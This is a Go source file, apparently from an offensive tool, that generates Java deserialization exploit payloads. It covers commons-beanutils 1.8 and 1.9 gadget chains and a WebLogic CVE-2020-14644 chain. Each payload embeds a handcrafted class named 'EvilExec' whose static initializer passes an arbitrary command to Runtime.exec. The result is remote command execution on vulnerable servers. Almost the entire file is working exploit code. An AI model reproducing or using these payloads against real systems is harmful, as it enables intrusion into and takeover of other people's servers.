package payload

import (
	"encoding/binary"
	"strings"
)

var (
	IExecManager ExecManager
)

type ExecManager struct {
	dict map[string]*ExecWrapper
}

type ExecWrapper struct {
	f    func(string) []byte
	name string
}

func (m *ExecManager) Set(name string, f func(string) []byte) {
	m.dict[name] = &ExecWrapper{f: f, name: name}
}

func (m *ExecManager) SetCustom(custom []byte) {
	name := "custom"
	f := func(command string) []byte {
		return custom
	}
	m.dict[name] = &ExecWrapper{f: f, name: name}
}

func (m *ExecManager) Get(name string) (*ExecWrapper, bool) {
	if gadget, ok := m.dict[name]; ok {
		return gadget, ok
	}
	return nil, false
}

func (m *ExecManager) GetCustom() (*ExecWrapper, bool) {
	name := "custom"
	if gadget, ok := m.dict[name]; ok {
		return gadget, ok
	}
	return nil, false
}

func (m *ExecManager) String() string {
	var builder strings.Builder
	for k, _ := range m.dict {
		builder.WriteString(k)
		builder.WriteString(", ")
	}
	return strings.TrimSuffix(builder.String(), ", ")
}

func (w *ExecWrapper) Exec(command string) []byte {
	return w.f(command)
}

func (w *ExecWrapper) Name() string {
	return w.name
}

func init() {
	IExecManager.dict = make(map[string]*ExecWrapper)
	// commons-beanutils 1.8.X
	IExecManager.Set("cb1v18", commonsBeanutils1v18)
	// commons-beanutils 1.9.X
	IExecManager.Set("cb1v19", commonsBeanutils1v19)
	// CVE-2020-14644 weblogic 12.2.1.4.0
	IExecManager.Set("wl1", weblogic1)
}

func weblogic1(command string) []byte {
	iexec := func(command string) []byte {
		var (
			prefix  = []byte("\xca\xfe\xba\xbe\x00\x00\x004\x00\x1b\x01\x00\x01X\x07\x00\x07\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x06X.java\x01\x00$x/X$A63EB65B5CEDD1B16A986727CF372CEE\x01\x00\x08<clinit>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x11java/lang/Runtime\x07\x00\x0b\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00\r\x00\x0e\n\x00\x0c\x00\x0f\x01")
			postfix = []byte("\x08\x00\x11\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x00\x13\x00\x14\n\x00\x0c\x00\x15\x01\x00\rStackMapTable\x01\x00\x06<init>\x0c\x00\x18\x00\t\n\x00\x04\x00\x19\x00!\x00\x02\x00\x04\x00\x00\x00\x00\x00\x02\x00\x08\x00\x08\x00\t\x00\x01\x00\n\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00\x10\x12\x12\xb6\x00\x16W\xb1\x00\x00\x00\x01\x00\x17\x00\x00\x00\x03\x00\x01\x03\x00\x01\x00\x18\x00\t\x00\x01\x00\n\x00\x00\x00\x11\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x1a\xb1\x00\x00\x00\x00\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06")
		)
		buf := make([]byte, 0)
		buf = append(postfix, buf...)

		buf = append([]byte(command), buf...)

		buf = append(make([]byte, 2), buf...)
		binary.BigEndian.PutUint16(buf, uint16(len(command)))

		buf = append(prefix, buf...)

		return buf
	}
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00)weblogic.rmi.provider.BasicServiceContext\xe4c\"6\xc5\xd4\xa7\x1e\x0c\x00\x00xpw\x02\x01\x00sr\x00.com.tangosol.coherence.servlet.AttributeHolder\xcc0\xa4x=\xefj\xc1\x0c\x00\x00xpz\x00\x00\x02X@\n3com.tangosol.internal.util.invoke.RemoteConstructor\n1com.tangosol.internal.util.invoke.ClassDefinition\n/com.tangosol.internal.util.invoke.ClassIdentity\x01x\x01X A63EB65B5CEDD1B16A986727CF372CEE")
		postfix = []byte("\x00\x00\x00\x00xx")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	class := iexec(command)
	buf = append(class, buf...)

	n := len(class)
	b := 0
	b |= n & 63

	cl := make([]byte, 0)
	for n = n >> 6; n != 0; n = n >> 7 {
		b |= 128
		cl = append(cl, byte(b))
		b = n & 127
	}
	cl = append(cl, byte(b))

	buf = append(cl, buf...)

	buf = append(prefix, buf...)

	return buf
}

func commonsBeanutils1v18(command string) []byte {
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator")
		uid     = []byte("\xcf\x8e\x01\x82\xfeN\xf1~")
		midfix  = []byte("\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00*java.lang.String$CaseInsensitiveComparatorw\x03\\}\\P\xe5\xce\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x06I\x00\r_indentNumberI\x00\x0e_transletIndex[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp")
		postfix = []byte("pt\x00\x00pw\x01\x00xsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01x")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	class := exec(command)
	buf = append(class, buf...)

	buf = append(make([]byte, 4), buf...)
	binary.BigEndian.PutUint32(buf, uint32(len(class)))

	buf = append(midfix, buf...)
	buf = append(uid, buf...)
	buf = append(prefix, buf...)
	return buf
}

func commonsBeanutils1v19(command string) []byte {
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00\x17java.util.PriorityQueue\x94\xda0\xb4\xfb?\x82\xb1\x03\x00\x02I\x00\x04sizeL\x00\ncomparatort\x00\x16Ljava/util/Comparator;xp\x00\x00\x00\x02sr\x00+org.apache.commons.beanutils.BeanComparator")
		uid     = []byte("\xe3\xa1\x88\xeas\"\xa4H")
		midfix  = []byte("\x02\x00\x02L\x00\ncomparatorq\x00~\x00\x01L\x00\x08propertyt\x00\x12Ljava/lang/String;xpsr\x00*java.lang.String$CaseInsensitiveComparatorw\x03\\}\\P\xe5\xce\x02\x00\x00xpt\x00\x10outputPropertiesw\x04\x00\x00\x00\x03sr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x06I\x00\r_indentNumberI\x00\x0e_transletIndex[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x04L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp")
		postfix = []byte("pt\x00\x00pw\x01\x00xsr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01x")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	class := exec(command)
	buf = append(class, buf...)

	buf = append(make([]byte, 4), buf...)
	binary.BigEndian.PutUint32(buf, uint32(len(class)))

	buf = append(midfix, buf...)
	buf = append(uid, buf...)
	buf = append(prefix, buf...)
	return buf
}

func exec(command string) []byte {
	var (
		prefix  = []byte("\xca\xfe\xba\xbe\x00\x00\x004\x00\x1c\x01\x00\x08EvilExec\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\rEvilExec.java\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\x07\x01\x00\x08<clinit>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x11java/lang/Runtime\x07\x00\x0c\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00\x0e\x00\x0f\n\x00\r\x00\x10\x01")
		postfix = []byte("\x08\x00\x12\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x00\x14\x00\x15\n\x00\r\x00\x16\x01\x00\rStackMapTable\x01\x00\x06<init>\x0c\x00\x19\x00\n\n\x00\x08\x00\x1a\x00!\x00\x02\x00\x08\x00\x00\x00\x00\x00\x02\x00\x08\x00\t\x00\n\x00\x01\x00\x0b\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00\x11\x12\x13\xb6\x00\x17W\xb1\x00\x00\x00\x01\x00\x18\x00\x00\x00\x03\x00\x01\x03\x00\x01\x00\x19\x00\n\x00\x01\x00\x0b\x00\x00\x00\x11\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x1b\xb1\x00\x00\x00\x00\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06")
	)
	buf := make([]byte, 0)
	buf = append(postfix, buf...)

	buf = append([]byte(command), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(command)))

	buf = append(prefix, buf...)

	return buf
}
